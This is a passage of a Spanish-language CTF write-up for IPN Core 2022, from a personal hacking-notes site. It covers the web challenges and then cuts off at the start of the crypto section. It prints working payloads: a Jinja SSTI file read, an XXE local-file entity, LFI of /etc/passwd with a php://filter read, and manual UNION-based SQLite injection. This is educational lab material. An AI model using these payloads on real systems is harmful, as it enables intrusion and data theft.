<!DOCTYPE HTML>
<html lang="es" class="sidebar-visible no-js ayu">
    <head>
        <!-- Book generated using mdBook -->
        <meta charset="UTF-8">
        <title>22/09/2022 - IPN Core 2022 CTF - Secronomicón</title>
        <!-- Custom HTML head -->
        <meta content="text/html; charset=utf-8" http-equiv="Content-Type">
        <meta name="description" content="Libro de notas donde encontrarás cada truco/técnica/guía de hacking que he aprendido y recolectado de CTFS, aplicaciones reales, lectura de writeups y noticias.">
        <meta name="viewport" content="width=device-width, initial-scale=1">
        <meta name="theme-color" content="#ffffff" />

        <link rel="icon" href="../../favicon.svg">
        <link rel="shortcut icon" href="../../favicon.png">
        <link rel="stylesheet" href="../../css/variables.css">
        <link rel="stylesheet" href="../../css/general.css">
        <link rel="stylesheet" href="../../css/chrome.css">
        <link rel="stylesheet" href="../../css/print.css" media="print">
        <!-- Fonts -->
        <link rel="stylesheet" href="../../FontAwesome/css/font-awesome.css">
        <link rel="stylesheet" href="../../fonts/fonts.css">
        <!-- Highlight.js Stylesheets -->
        <link rel="stylesheet" href="../../highlight.css">
        <link rel="stylesheet" href="../../tomorrow-night.css">
        <link rel="stylesheet" href="../../ayu-highlight.css">

        <!-- Custom theme stylesheets -->
    </head>
    <body>
        <!-- Provide site root to javascript -->
        <script type="text/javascript">
            var path_to_root = "../../";
            var default_theme = window.matchMedia("(prefers-color-scheme: dark)").matches ? "ayu" : "ayu";
        </script>

        <!-- Work around some values being stored in localStorage wrapped in quotes -->
        <script type="text/javascript">
            try {
                var theme = localStorage.getItem('mdbook-theme');
                var sidebar = localStorage.getItem('mdbook-sidebar');

                if (theme.startsWith('"') && theme.endsWith('"')) {
                    localStorage.setItem('mdbook-theme', theme.slice(1, theme.length - 1));
                }

                if (sidebar.startsWith('"') && sidebar.endsWith('"')) {
                    localStorage.setItem('mdbook-sidebar', sidebar.slice(1, sidebar.length - 1));
                }
            } catch (e) { }
        </script>

        <!-- Set the theme before any content is loaded, prevents flash -->
        <script type="text/javascript">
            var theme;
            try { theme = localStorage.getItem('mdbook-theme'); } catch(e) { }
            if (theme === null || theme === undefined) { theme = default_theme; }
            var html = document.querySelector('html');
            html.classList.remove('no-js')
            html.classList.remove('ayu')
            html.classList.add(theme);
            html.classList.add('js');
        </script>

        <!-- Hide / unhide sidebar before it is displayed -->
        <script type="text/javascript">
            var html = document.querySelector('html');
            var sidebar = 'hidden';
            if (document.body.clientWidth >= 1080) {
                try { sidebar = localStorage.getItem('mdbook-sidebar'); } catch(e) { }
                sidebar = sidebar || 'visible';
            }
            html.classList.remove('sidebar-visible');
            html.classList.add("sidebar-" + sidebar);
        </script>

        <nav id="sidebar" class="sidebar" aria-label="Table of contents">
            <div class="sidebar-scrollbox">
                <ol class="chapter"><li class="chapter-item expanded affix "><a href="../../index.html">Secronomicón</a></li><li class="chapter-item expanded affix "><li class="part-title">Guías / Cursos</li><li class="chapter-item expanded "><a href="../../guides/oscp_bof/index.html"><strong aria-hidden="true">1.</strong> OSCP Buffer Overflow</a></li><li class="chapter-item expanded "><div><strong aria-hidden="true">2.</strong> Port Swigger Academy</div></li><li><ol class="section"><li class="chapter-item expanded "><a href="../../guides/port_swigger_academy/sql_injection.html"><strong aria-hidden="true">2.1.</strong> SQL Injection</a></li></ol></li><li class="chapter-item expanded "><a href="../../guides/pwncollege/index.html"><strong aria-hidden="true">3.</strong> PwnCollege</a></li><li><ol class="section"><li class="chapter-item expanded "><a href="../../guides/pwncollege/0_module/index.html"><strong aria-hidden="true">3.1.</strong> Módulo 0</a></li></ol></li><li class="chapter-item expanded "><a href="../../guides/active_directory/index.html"><strong aria-hidden="true">4.</strong> Active Directory</a></li><li><ol class="section"><li class="chapter-item expanded "><a href="../../guides/active_directory/0_general.html"><strong aria-hidden="true">4.1.</strong> Teoría General</a></li><li class="chapter-item expanded "><a href="../../guides/active_directory/1_attacking.html"><strong aria-hidden="true">4.2.</strong> Atacando Active Directory</a></li></ol></li><li class="chapter-item expanded "><a href="../../guides/ecpptv2_lab/index.html"><strong aria-hidden="true">5.</strong> eCPPTv2 s4viLab</a></li><li><ol class="section"><li class="chapter-item expanded "><a href="../../guides/ecpptv2_lab/1_aragog/index.html"><strong aria-hidden="true">5.1.</strong> Aragog</a></li><li class="chapter-item expanded "><a href="../../guides/ecpptv2_lab/2_nagini/index.html"><strong aria-hidden="true">5.2.</strong> Nagini</a></li><li class="chapter-item expanded "><a href="../../guides/ecpptv2_lab/3_fawkes/index.html"><strong aria-hidden="true">5.3.</strong> Fawkes</a></li><li class="chapter-item expanded "><div><strong aria-hidden="true">5.4.</strong> Matrix 1</div></li><li class="chapter-item expanded "><div><strong aria-hidden="true">5.5.</strong> Brainpan</div></li></ol></li><li class="chapter-item expanded "><a href="../../guides/nightmare/index.html"><strong aria-hidden="true">6.</strong> Nightmare</a></li><li class="chapter-item expanded affix "><li class="part-title">Misc</li><li class="chapter-item expanded "><a href="../../templates/index.html"><strong aria-hidden="true">7.</strong> Templates</a></li><li class="chapter-item expanded affix "><li class="part-title">Cheat Sheets</li><li class="chapter-item expanded "><a href="../../cheat_sheets/general.html"><strong aria-hidden="true">8.</strong> General</a></li><li class="chapter-item expanded "><a href="../../cheat_sheets/active_directory.html"><strong aria-hidden="true">9.</strong> Active Directory</a></li><li class="chapter-item expanded "><a href="../../cheat_sheets/network/general.html"><strong aria-hidden="true">10.</strong> Network</a></li><li><ol class="section"><li class="chapter-item expanded "><a href="../../cheat_sheets/network/pivoting.html"><strong aria-hidden="true">10.1.</strong> Pivoting</a></li></ol></li><li class="chapter-item expanded "><div><strong aria-hidden="true">11.</strong> Pwning</div></li><li><ol class="section"><li class="chapter-item expanded "><a href="../../cheat_sheets/pwning/linux.html"><strong aria-hidden="true">11.1.</strong> Linux pwning</a></li><li class="chapter-item expanded "><a href="../../cheat_sheets/pwning/bof-oscp.html"><strong aria-hidden="true">11.2.</strong> OSCP Buffer Overflow</a></li></ol></li><li class="chapter-item expanded "><a href="../../cheat_sheets/fuzzing.html"><strong aria-hidden="true">12.</strong> Fuzzing</a></li><li class="chapter-item expanded "><a href="../../cheat_sheets/inyecciones.html"><strong aria-hidden="true">13.</strong> Inyecciones</a></li><li class="chapter-item expanded "><a href="../../cheat_sheets/transfer.html"><strong aria-hidden="true">14.</strong> Transferencia de archivos</a></li><li class="chapter-item expanded affix "><li class="part-title">CTFs</li><li class="chapter-item expanded "><a href="../../ctfs/20220922_ctf-core2022/index.html" class="active"><strong aria-hidden="true">15.</strong> 22/09/2022 - IPN Core 2022 CTF</a></li><li class="chapter-item expanded affix "><li class="part-title">Hack The Box</li><li class="chapter-item expanded "><div><strong aria-hidden="true">16.</strong> Battlegrounds</div></li><li><ol class="section"><li class="chapter-item expanded "><a href="../../htb/battlegrounds/mayhem/index.html"><strong aria-hidden="true">16.1.</strong> Cyber Mayhem</a></li></ol></li><li class="chapter-item expanded "><div><strong aria-hidden="true">17.</strong> Challenges</div></li><li class="chapter-item expanded "><div><strong aria-hidden="true">18.</strong> Boxes</div></li><li><ol class="section"><li class="chapter-item expanded "><div><strong aria-hidden="true">18.1.</strong> Linux</div></li><li><ol class="section"><li class="chapter-item expanded "><div><strong aria-hidden="true">18.1.1.</strong> Fácil</div></li><li class="chapter-item expanded "><div><strong aria-hidden="true">18.1.2.</strong> Medio</div></li><li class="chapter-item expanded "><div><strong aria-hidden="true">18.1.3.</strong> Difícil</div></li><li class="chapter-item expanded "><div><strong aria-hidden="true">18.1.4.</strong> Locura</div></li></ol></li><li class="chapter-item expanded "><div><strong aria-hidden="true">18.2.</strong> Windows</div></li><li><ol class="section"><li class="chapter-item expanded "><div><strong aria-hidden="true">18.2.1.</strong> Fácil</div></li><li><ol class="section"><li class="chapter-item expanded "><a href="../../htb/boxes/windows/1_facil/Active/index.html"><strong aria-hidden="true">18.2.1.1.</strong> Active</a></li><li class="chapter-item expanded "><a href="../../htb/boxes/windows/1_facil/Devel/index.html"><strong aria-hidden="true">18.2.1.2.</strong> Devel</a></li><li class="chapter-item expanded "><a href="../../htb/boxes/windows/1_facil/Remote/index.html"><strong aria-hidden="true">18.2.1.3.</strong> Remote</a></li><li class="chapter-item expanded "><a href="../../htb/boxes/windows/1_facil/Access/index.html"><strong aria-hidden="true">18.2.1.4.</strong> Access</a></li></ol></li><li class="chapter-item expanded "><div><strong aria-hidden="true">18.2.2.</strong> Medio</div></li><li><ol class="section"><li class="chapter-item expanded "><a href="../../htb/boxes/windows/2_medio/Chatterbox/index.html"><strong aria-hidden="true">18.2.2.1.</strong> Chatterbox</a></li><li class="chapter-item expanded "><a href="../../htb/boxes/windows/2_medio/Jeeves/index.html"><strong aria-hidden="true">18.2.2.2.</strong> Jeeves</a></li><li class="chapter-item expanded "><a href="../../htb/boxes/windows/2_medio/SecNotes/index.html"><strong aria-hidden="true">18.2.2.3.</strong> SecNotes</a></li><li class="chapter-item expanded "><a href="../../htb/boxes/windows/2_medio/Silo/index.html"><strong aria-hidden="true">18.2.2.4.</strong> Silo</a></li></ol></li><li class="chapter-item expanded "><div><strong aria-hidden="true">18.2.3.</strong> Difícil</div></li><li><ol class="section"><li class="chapter-item expanded "><a href="../../htb/boxes/windows/3_dificil/Control/index.html"><strong aria-hidden="true">18.2.3.1.</strong> Control</a></li><li class="chapter-item expanded "><a href="../../htb/boxes/windows/3_dificil/Search/index.html"><strong aria-hidden="true">18.2.3.2.</strong> Search</a></li></ol></li><li class="chapter-item expanded "><div><strong aria-hidden="true">18.2.4.</strong> Locura</div></li></ol></li></ol></li><li class="chapter-item expanded "><li class="part-title">echoCTF</li><li class="chapter-item expanded "><div><strong aria-hidden="true">19.</strong> Challenges</div></li><li class="chapter-item expanded "><div><strong aria-hidden="true">20.</strong> Networks</div></li><li class="chapter-item expanded "><div><strong aria-hidden="true">21.</strong> Targets</div></li><li><ol class="section"><li class="chapter-item expanded "><div><strong aria-hidden="true">21.1.</strong> Principiante</div></li><li class="chapter-item expanded "><div><strong aria-hidden="true">21.2.</strong> Básico</div></li><li><ol class="section"><li class="chapter-item expanded "><a href="../../echoCTF/targets/2_basic/Flanders/index.html"><strong aria-hidden="true">21.2.1.</strong> Flanders</a></li><li class="chapter-item expanded "><a href="../../echoCTF/targets/2_basic/Smithers/index.html"><strong aria-hidden="true">21.2.2.</strong> Smithers</a></li></ol></li><li class="chapter-item expanded "><div><strong aria-hidden="true">21.3.</strong> Intermedio</div></li><li class="chapter-item expanded "><div><strong aria-hidden="true">21.4.</strong> Avanzado</div></li><li class="chapter-item expanded "><div><strong aria-hidden="true">21.5.</strong> Experto</div></li><li><ol class="section"><li class="chapter-item expanded "><a href="../../echoCTF/targets/5_expert/gogo-yubari/index.html"><strong aria-hidden="true">21.5.1.</strong> Gogo Yubari</a></li><li class="chapter-item expanded "><a href="../../echoCTF/targets/5_expert/hajmetr/index.html"><strong aria-hidden="true">21.5.2.</strong> Hajmetr</a></li></ol></li><li class="chapter-item expanded "><div><strong aria-hidden="true">21.6.</strong> Guru</div></li></ol></li></ol>
            </div>
            <div id="sidebar-resize-handle" class="sidebar-resize-handle"></div>
        </nav>

        <div id="page-wrapper" class="page-wrapper">

            <div class="page">
                <div id="menu-bar-hover-placeholder"></div>
                <div id="menu-bar" class="menu-bar sticky bordered">
                    <div class="left-buttons">
                        <button id="sidebar-toggle" class="icon-button" type="button" title="Toggle Table of Contents" aria-label="Toggle Table of Contents" aria-controls="sidebar">
                            <i class="fa fa-bars"></i>
                        </button>
                        <button id="theme-toggle" class="icon-button" type="button" title="Change theme" aria-label="Change theme" aria-haspopup="true" aria-expanded="false" aria-controls="theme-list">
                            <i class="fa fa-paint-brush"></i>
                        </button>
                        <ul id="theme-list" class="theme-popup" aria-label="Themes" role="menu">
                            <li role="none"><button role="menuitem" class="theme" id="light">Light</button></li>
                            <li role="none"><button role="menuitem" class="theme" id="rust">Rust</button></li>
                            <li role="none"><button role="menuitem" class="theme" id="coal">Coal</button></li>
                            <li role="none"><button role="menuitem" class="theme" id="navy">Navy</button></li>
                            <li role="none"><button role="menuitem" class="theme" id="ayu">Ayu (default)</button></li>
                        </ul>
                        <button id="search-toggle" class="icon-button" type="button" title="Search. (Shortkey: s)" aria-label="Toggle Searchbar" aria-expanded="false" aria-keyshortcuts="S" aria-controls="searchbar">
                            <i class="fa fa-search"></i>
                        </button>
                    </div>

                    <h1 class="menu-title">Secronomicón</h1>

                    <div class="right-buttons">
                        <a href="../../print.html" title="Print this book" aria-label="Print this book">
                            <i id="print-button" class="fa fa-print"></i>
                        </a>
                    </div>
                </div>

                <div id="search-wrapper" class="hidden">
                    <form id="searchbar-outer" class="searchbar-outer">
                        <input type="search" id="searchbar" name="searchbar" placeholder="Search this book ..." aria-controls="searchresults-outer" aria-describedby="searchresults-header">
                    </form>
                    <div id="searchresults-outer" class="searchresults-outer hidden">
                        <div id="searchresults-header" class="searchresults-header"></div>
                        <ul id="searchresults">
                        </ul>
                    </div>
                </div>
                <!-- Apply ARIA attributes after the sidebar and the sidebar toggle button are added to the DOM -->
                <script type="text/javascript">
                    document.getElementById('sidebar-toggle').setAttribute('aria-expanded', sidebar === 'visible');
                    document.getElementById('sidebar').setAttribute('aria-hidden', sidebar !== 'visible');
                    Array.from(document.querySelectorAll('#sidebar a')).forEach(function(link) {
                        link.setAttribute('tabIndex', sidebar === 'visible' ? 0 : -1);
                    });
                </script>

                <div id="content" class="content">
                    <main>
                        <h1 id="ipn-core-2022-ctf---writeup"><a class="header" href="#ipn-core-2022-ctf---writeup">IPN Core 2022 CTF - Writeup</a></h1>
<h2 id="tabla-de-contenido"><a class="header" href="#tabla-de-contenido">Tabla de Contenido <!-- omit from toc --></a></h2>
<ul>
<li><a href="#resumen-de-vulnerabilidades">Resumen de vulnerabilidades</a></li>
<li><a href="#web">Web</a>
<ul>
<li><a href="#pentest-web-parte-1">Pentest web Parte 1</a>
<ul>
<li><a href="#info">Info</a></li>
<li><a href="#soluci%C3%B3n">Solución</a></li>
</ul>
</li>
<li><a href="#pentest-web-parte-2">Pentest web Parte 2</a>
<ul>
<li><a href="#info-1">Info</a></li>
<li><a href="#soluci%C3%B3n-1">Solución</a></li>
</ul>
</li>
<li><a href="#pentest-web-parte-3">Pentest web Parte 3</a>
<ul>
<li><a href="#info-2">Info</a></li>
<li><a href="#soluci%C3%B3n-2">Solución</a></li>
</ul>
</li>
<li><a href="#cic-blog">CIC Blog</a>
<ul>
<li><a href="#info-3">Info</a></li>
<li><a href="#soluci%C3%B3n-3">Solución</a></li>
</ul>
</li>
<li><a href="#tacos-don-chano">Tacos Don Chano</a>
<ul>
<li><a href="#info-4">Info</a></li>
<li><a href="#soluci%C3%B3n-4">Solución</a></li>
</ul>
</li>
</ul>
</li>
<li><a href="#crypto">Crypto</a>
<ul>
<li><a href="#encoding">Encoding</a>
<ul>
<li><a href="#info-5">Info</a></li>
<li><a href="#soluci%C3%B3n-5">Solución</a></li>
</ul>
</li>
<li><a href="#esoteric0">Esoteric0</a>
<ul>
<li><a href="#info-6">Info</a></li>
<li><a href="#soluci%C3%B3n-6">Solución</a></li>
</ul>
</li>
<li><a href="#aesy">AESy</a>
<ul>
<li><a href="#info-7">Info</a></li>
<li><a href="#soluci%C3%B3n-7">Solución</a></li>
</ul>
</li>
<li><a href="#realbabyrsa">RealBabyRSA</a>
<ul>
<li><a href="#info-8">Info</a></li>
<li><a href="#soluci%C3%B3n-8">Solución</a></li>
</ul>
</li>
<li><a href="#baby-fa">Baby-FA</a>
<ul>
<li><a href="#info-9">Info</a></li>
<li><a href="#soluci%C3%B3n-9">Solución</a></li>
</ul>
</li>
</ul>
</li>
<li><a href="#reversing">Reversing</a>
<ul>
<li><a href="#t3sla">T3SLA</a>
<ul>
<li><a href="#info-10">Info</a></li>
<li><a href="#soluci%C3%B3n-10">Solución</a></li>
</ul>
</li>
<li><a href="#t3sla---parte-2">T3SLA - Parte 2</a>
<ul>
<li><a href="#info-11">Info</a></li>
<li><a href="#soluci%C3%B3n-11">Solución</a></li>
</ul>
</li>
<li><a href="#t3sla---parte-3">T3SLA - Parte 3</a>
<ul>
<li><a href="#info-12">Info</a></li>
<li><a href="#soluci%C3%B3n-12">Solución</a></li>
</ul>
</li>
</ul>
</li>
<li><a href="#pwning">Pwning</a>
<ul>
<li><a href="#babypwn">BabyPWN</a>
<ul>
<li><a href="#info-13">Info</a></li>
<li><a href="#soluci%C3%B3n-13">Solución</a></li>
</ul>
</li>
<li><a href="#babypwn---parte-2">BabyPWN - Parte 2</a>
<ul>
<li><a href="#info-14">Info</a></li>
<li><a href="#soluci%C3%B3n-14">Solución</a></li>
</ul>
</li>
<li><a href="#babypwn---parte-3">BabyPWN - Parte 3</a>
<ul>
<li><a href="#info-15">Info</a></li>
<li><a href="#soluci%C3%B3n-15">Solución</a></li>
</ul>
</li>
</ul>
</li>
<li><a href="#misc">Misc</a>
<ul>
<li><a href="#bot-calculadora">Bot Calculadora</a>
<ul>
<li><a href="#info-16">Info</a></li>
<li><a href="#soluci%C3%B3n-16">Solución</a></li>
</ul>
</li>
</ul>
</li>
</ul>
<h2 id="resumen-de-vulnerabilidades"><a class="header" href="#resumen-de-vulnerabilidades">Resumen de vulnerabilidades</a></h2>
<ul>
<li>SSRF</li>
<li>SSTI</li>
<li>XXE</li>
<li>LFI + php filters</li>
<li>SQLi</li>
<li>AES CBC Bit Flipping</li>
<li>RSA Common Modulus</li>
</ul>
<h2 id="web"><a class="header" href="#web">Web</a></h2>
<h3 id="pentest-web-parte-1"><a class="header" href="#pentest-web-parte-1">Pentest web Parte 1</a></h3>
<h4 id="info"><a class="header" href="#info">Info</a></h4>
<div class="table-wrapper"><table><thead><tr><th>Atributo</th><th>Valor</th></tr></thead><tbody>
<tr><td>Descripción</td><td>Uhmm no necesitas contexto...</td></tr>
<tr><td>Archivos</td><td><a href="https://github.com/srrequiem/CTF-Challenge-Compilation/tree/main/20220922_ipn_core_2022/files/web_pentest_web_1.zip">web_pentest_web_1.zip</a></td></tr>
</tbody></table>
</div>
<h4 id="solución"><a class="header" href="#solución">Solución</a></h4>
<p>Al interactuar con la página web, se puede visualizar en el código fuente un comentario que indica el lugar donde se encuentra ubicada la bandera.</p>
<p><img src="images/web_pentest_1_1.png" alt="Ubicación de bandera" /></p>
<p>Tomando en cuenta esto, se pudiera sospechar de algún tipo de inclusión de archivos locales o algo por el estilo. Continuando con la interacción del sitio se puede visualizar una excepción del método <code>fopen</code> de php el cuál esta recibiendo el contenido del input disponible.</p>
<p><img src="images/web_pentest_1_2.png" alt="Excepción de fopen" /></p>
<p>Si se busca en el <a href="https://open.spotify.com/playlist/0VHNhrWyp0X3CdCdhyRQyI?si=73871d004a434312">manual de php acerca de la función</a>, se puede visualizar que esta recibirá como parámetro una ruta de un directorio, por lo que si se emplea un archivo existente como <code>/flag.txt</code> se podrá visualizar su contenido, realizando la petición con <code>curl</code> o a través de algún proxy como <code>BurpSuite</code>.</p>
<p><img src="images/web_pentest_1_3.png" alt="Contenido de flag.txt" /></p>
<p>Flag: <code>CTF{9700cbd3cd4dc8c2010953ca1a029bd0}</code></p>
<h3 id="pentest-web-parte-2"><a class="header" href="#pentest-web-parte-2">Pentest web Parte 2</a></h3>
<h4 id="info-1"><a class="header" href="#info-1">Info</a></h4>
<div class="table-wrapper"><table><thead><tr><th>Atributo</th><th>Valor</th></tr></thead><tbody>
<tr><td>Descripción</td><td>Uhmm nop, no necesitas descripción... ¿o sí?</td></tr>
<tr><td>Archivos</td><td><a href="https://github.com/srrequiem/CTF-Challenge-Compilation/tree/main/20220922_ipn_core_2022/files/web_pentest_web_2.zip">web_pentest_web_2.zip</a></td></tr>
</tbody></table>
</div>
<h4 id="solución-1"><a class="header" href="#solución-1">Solución</a></h4>
<p>Se puede visualizar un input el cuál al enviar/completar la petición se refleja nuestro contenido.</p>
<p><img src="images/web_pentest_2_1.png" alt="Contenido de input reflejado" /></p>
<p>Al tratar de reconocer las tecnologías que &quot;hostean&quot; el reto, se pudieron identificar por las cabeceras de las respuestas del servidor la versión de una librería y versión de Python (<code>Werkzeug/2.2.2 Python/3.8.14</code>).</p>
<p><img src="images/web_pentest_2_2.png" alt="Versión de Python" /></p>
<p>Al identificar esto, lo primero que pudiera llegarse a considerar es que el código HTML este siendo pre-procesado por esta librería de Python. En el proceso de ese pre-procesamiento se pueden encontrar vulnerabilidades de inyección de plantillas (SSTI), por lo que al hacer uso de <code>{{7*7}}</code> en el campo de nombre se pudo validar que se trataba de esto en cuestión.</p>
<p><img src="images/web_pentest_2_3.png" alt="Inyección" /></p>
<p>Utilizando el siguiente payload se podía leer la bandera:</p>
<pre><code class="language-python">{{ request.__class__._load_form_data.__globals__.__builtins__.open(&quot;/flag.txt&quot;).read() }}
</code></pre>
<p><img src="images/web_pentest_2_4.png" alt="Inyección" /></p>
<p>Flag: <code>CTF{d4bac92d0e15c50d3431043e27c62163}</code></p>
<h3 id="pentest-web-parte-3"><a class="header" href="#pentest-web-parte-3">Pentest web Parte 3</a></h3>
<h4 id="info-2"><a class="header" href="#info-2">Info</a></h4>
<div class="table-wrapper"><table><thead><tr><th>Atributo</th><th>Valor</th></tr></thead><tbody>
<tr><td>Descripción</td><td>Es divertido el pentest web desde Blackbox ¿no? :)</td></tr>
<tr><td>Archivos</td><td><a href="https://github.com/srrequiem/CTF-Challenge-Compilation/tree/main/20220922_ipn_core_2022/files/web_pentest_web_3.zip">web_pentest_web_3.zip</a></td></tr>
</tbody></table>
</div>
<h4 id="solución-2"><a class="header" href="#solución-2">Solución</a></h4>
<p>Al entrar en la web se visualizan dos enlaces en los cuales, en uno de ellos nos revela la ubicación de la flag (<code>/flag</code>) y en el otro nos permite interactuar con un submit brindándonos una caja de texto en la que podamos mandar un saludo (<code>/rest</code>). Al mandar una prueba se puede visualizar una excepción relacionada con XML.</p>
<p><img src="images/web_pentest_3_1.png" alt="Excepción XML" /></p>
<p>A lo que lleva a concluir de una vulnerabilidad de tipo XXE, al buscar y encontrar el siguiente payload:</p>
<pre><code class="language-xml">&lt;!--?xml version=&quot;1.0&quot; ?--&gt;
&lt;!DOCTYPE foo [&lt;!ENTITY example SYSTEM &quot;/flag.txt&quot;&gt; ]&gt;
&lt;data&gt;&amp;example;&lt;/data&gt;
</code></pre>
<p>Se pudo obtener la bandera incluyendo el archivo y desplegando el archivo indicado.</p>
<p><img src="images/web_pentest_3_2.png" alt="Inclusión de bandera" /></p>
<p>Flag: <code>CTF{e4b50e71a8f7ec1f5c3b8db6a91ce2ff}</code></p>
<h3 id="cic-blog"><a class="header" href="#cic-blog">CIC Blog</a></h3>
<h4 id="info-3"><a class="header" href="#info-3">Info</a></h4>
<div class="table-wrapper"><table><thead><tr><th>Atributo</th><th>Valor</th></tr></thead><tbody>
<tr><td>Descripción</td><td>¿Qué tal? Estoy por terminar mi blog y un colega de {|4_p4nd1||4_m4nt3q1||4}  me hizo favor de revisar el sitio, había encontrado algo pero aún no termina.  Mientras tanto me gustaría saber que encontró, ¿me ayudas también a revisarlo?</td></tr>
<tr><td>Archivos</td><td><a href="https://github.com/srrequiem/CTF-Challenge-Compilation/tree/main/20220922_ipn_core_2022/files/web_cic_blog.zip">web_cic_blog.zip</a></td></tr>
</tbody></table>
</div>
<h4 id="solución-3"><a class="header" href="#solución-3">Solución</a></h4>
<p>Al buscar información dentro del código fuente se puede visualizar un wrapper de contenido dentro de la barra lateral izquierda, indicando mediante el parámetro <code>page</code> la página a cargar.</p>
<p><img src="images/web_cic_blog_1.png" alt="Inclusión de archivos" /></p>
<p>Al realizar una prueba para buscar incluir un archivo de sistema se puede visualizar su contenido <code>/wrapper.php?page=/etc/passwd</code>:</p>
<p><img src="images/web_cic_blog_2.png" alt="Inclusión passwd" /></p>
<p>Posteriormente, al no encontrar la bandera dentro de la raíz del sistema (<code>/flag.txt</code> o algo similar), se buscó fuzzear el sitio para ver si se encontraba información al respecto.</p>
<pre><code class="language-bash">ffuf -c -ic -u &quot;http://192.168.111.153:8000/FUZZ&quot; -w /usr/share/wordlists/dirb/common.txt
</code></pre>
<p><img src="images/web_cic_blog_3.png" alt="Fuzzing" /></p>
<p>Encontrando así varias entradas incluyendo <code>robots.txt</code>, la cual exponía mediante una regla de <code>Disallow</code> la ruta de la bandera.</p>
<p><img src="images/web_cic_blog_4.png" alt="robots.txt" /></p>
<p>Al incluir la ruta de la bandera se podía procesar su contenido <code>/wrapper.php?page=/var/www/flag.php</code> mencionando como pista &quot;pensar en algo diferente&quot;.</p>
<p><img src="images/web_cic_blog_5.png" alt="flag.php" /></p>
<p>Dado que los archivos php son procesados del lado del servidor y no se puede visualizar su contenido, fue necesario usar un <a href="https://www.php.net/manual/en/filters.convert.php">filtro de php</a> para poder extraer su contenido real, mediante la petición:</p>
<pre><code class="language-txt">/wrapper.php?page=php://filter/convert.base64-encode/resource=/var/www/flag.php
</code></pre>
<p>Extrayendo así el contenido del archivo encodeado en base64, para después desencodearlo y así encontrar el valor de la bandera.</p>
<p><img src="images/web_cic_blog_6.png" alt="flag.php" /></p>
<pre><code class="language-bash">echo &quot;PHN0eWxlPgogICAgLnBlcnJpbiB7CiAgICAgICAgdGV4dC1zaGFkb3c6IDJweCAycHggcmVkOwogICAgfQo8L3N0eWxlPgo8ZGl2IGNsYXNzPSJtYWluLXdyYXBwZXIiPgo8aDEgY2xhc3M9InBlcnJpbiI+QWggcGVycmluIGxlIHNhYmVzIGFsIExGSTwvaDE+CjxoMiBjbGFzcz0icGVycmluIj5ObyBjcmVhcyBxdWUgdmEgYSBzZXIgdGFuIGbDoWNpbCBvYnRlbmVyIHR1IGZsYWc8L2gyPgo8P3BocAogICRmbGFnID0gIkxQTXs0aF9wM3JyMW5fbGYxXzRfN2gzX3cxbn0iOwoJZWNobygiwr9ZYSBwZW5zYXN0ZSBlbiBhbGdvIGRpZmVyZW50ZT8iKTsKPz4KPC9kaXY+&quot; | base64 -d
</code></pre>
<p><img src="images/web_cic_blog_7.png" alt="flag.php desencodeado" /></p>
<p>Flag: <code>LPM{4h_p3rr1n_lf1_4_7h3_w1n}</code></p>
<h3 id="tacos-don-chano"><a class="header" href="#tacos-don-chano">Tacos Don Chano</a></h3>
<h4 id="info-4"><a class="header" href="#info-4">Info</a></h4>
<div class="table-wrapper"><table><thead><tr><th>Atributo</th><th>Valor</th></tr></thead><tbody>
<tr><td>Descripción</td><td>Me hice la promesa de ya entrar a mis clases de desarrollo web y le hice a mi tío Chano un sitio para que que pueda gestionar sus órdenes de tacos, pero de un momento a otro se ha estado comportando medio raro... y estoy teniendo errores inesperados, ¿qué crees que pueda estar mal?</td></tr>
<tr><td>Archivos</td><td><a href="https://github.com/srrequiem/CTF-Challenge-Compilation/tree/main/20220922_ipn_core_2022/files/web_tacos_don_chano.zip">web_tacos_don_chano.zip</a></td></tr>
</tbody></table>
</div>
<h4 id="solución-4"><a class="header" href="#solución-4">Solución</a></h4>
<p>Se permite interactuar con el sitio mediante un input que en resumen manda una petición a <code>/orden.php?id=1</code> indicando el supuesto id de la orden de tacos, modificando el id se pueden visualizar todas las órdenes disponibles en la plataforma la cuál se puede sospechar que está interactuando con una base de datos.</p>
<p>Enviando algún caracter diferente a un número (<code>/orden.php?id='</code>) se puede visualizar una excepción de SQL de la cuál se expone la versión/tipo de base de datos (SQLite3), dando paso a sospechar que se trata de una inyección SQL.</p>
<p><img src="images/web_tacos_chano_1.png" alt="Excepción SQL" /></p>
<p>Por lo que se podría automatizar el proceso con <code>sqlmap</code> o hacer a mano mediante:</p>
<ol>
<li>Identificación de número de columnas.</li>
</ol>
<pre><code class="language-text">/orden.php?id=1 UNION SELECT 1,2,3-- -
</code></pre>
<p><img src="images/web_tacos_chano_2.png" alt="Número de columnas" /></p>
<ol start="2">
<li>Identificación de columnas que permitan caracteres.</li>
</ol>
<pre><code class="language-text">/orden.php?id=1 UNION SELECT 'a','a','a'-- -
</code></pre>
<p><img src="images/web_tacos_chano_3.png" alt="Columnas con caracteres" /></p>
<ol start="3">
<li>Identificación de tablas.</li>
</ol>
<pre><code class="language-text">/orden.php?id=1 UNION SELECT (SELECT tbl_name FROM sqlite_master WHERE type='table' and tbl_name NOT like 'sqlite_%'),'a','a'-- -

Y:

/orden.php?id=1 UNION SELECT (SELECT tbl_name FROM sqlite_master WHERE type='table' and tbl_name NOT like 'sqlite_%' limit 2 offset 1),'a','a'-- -

Para identificar otras tablas.
</code></pre>
<p><img src="images/web_tacos_chano_4.png" alt="Identificación de otras tablas" /></p>
<ol start="4">
<li>Identificación de nombre de columnas en tabla identificada (opcional).</li>
</ol>
<pre><code class="language-text">/orden.php?id=1 UNION SELECT (SELECT sql FROM sqlite_master WHERE type!='meta' AND sql NOT NULL AND name ='flag'),'a','a'-- -
</code></pre>
<p><img src="images/web_tacos_chano_5.png" alt="Columnas de tabla" /></p>
<ol start="5">
<li>Extracción de valores.</li>
</ol>
<pre><code class="language-text">/orden.php?id=1 UNION SELECT (SELECT * FROM flag),'a','a'-- -
</code></pre>
<p><img src="images/web_tacos_chano_6.png" alt="Extracción de valores" /></p>
<p>Flag: <code>LPM{54l3n_2_d3_5u4p3rr0_p4r4_3l_j0v3n}</code></p>
<h2 id="crypto"><a class="header" href="#crypto">Crypto</a></h2>
<h3 id="encoding"><a class="header" href="#encoding">Encoding</a></h3>
<h4 id="info-5"><a class="header" href="#info-5">Info</a></h4>
<div class="table-wrapper"><table><thead><tr><th>Atributo</th><th>Valor</th></tr></thead><tbody>
<tr><td>Descripción</td><td>¿Qué tanto sabes de encoding?</td></tr>
<tr><td>Archivos</td><td><a href="https://github.com/srrequiem/CTF-Challenge-Compilation/tree/main/20220922_ipn_core_2022/files/crypto_encoding.txt">crypto_encoding.txt</a></td></tr>
</tbody></table>
</div>
